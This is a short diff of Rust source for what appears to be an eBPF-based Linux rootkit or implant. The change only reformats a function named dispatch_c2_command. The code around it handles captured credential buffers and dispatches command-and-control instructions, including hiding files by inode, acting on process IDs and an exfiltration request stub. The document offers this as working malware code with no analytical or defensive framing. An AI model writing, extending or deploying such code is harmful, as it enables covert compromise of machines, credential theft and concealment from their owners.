@@ -485,12 +485,7 @@ async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<ay
     }
 }
 
-fn dispatch_c2_command(
-    cmd_type: u32,
-    arg: u64,
-    c2_maps: &C2Maps,
-    kill_tx: &watch::Sender<bool>,
-) {
+fn dispatch_c2_command(cmd_type: u32, arg: u64, c2_maps: &C2Maps, kill_tx: &watch::Sender<bool>) {
     match cmd_type {
         1 => {
             let pid = arg as u32;
@@ -512,15 +507,13 @@ fn dispatch_c2_command(
                 Err(e) => error!("C2: lock error: {}", e),
             }
         }
-        3 => {
-            match c2_maps.obfuscate_inodes.lock() {
-                Ok(mut map) => match map.insert(arg, 1u8, 0) {
-                    Ok(_) => info!("C2: obfuscate_file inode={}", arg),
-                    Err(e) => error!("C2: failed to obfuscate inode {}: {}", arg, e),
-                },
-                Err(e) => error!("C2: lock error: {}", e),
-            }
-        }
+        3 => match c2_maps.obfuscate_inodes.lock() {
+            Ok(mut map) => match map.insert(arg, 1u8, 0) {
+                Ok(_) => info!("C2: obfuscate_file inode={}", arg),
+                Err(e) => error!("C2: failed to obfuscate inode {}: {}", arg, e),
+            },
+            Err(e) => error!("C2: lock error: {}", e),
+        },
         4 => {
             debug!("C2: exfil request target={}", arg);
         }
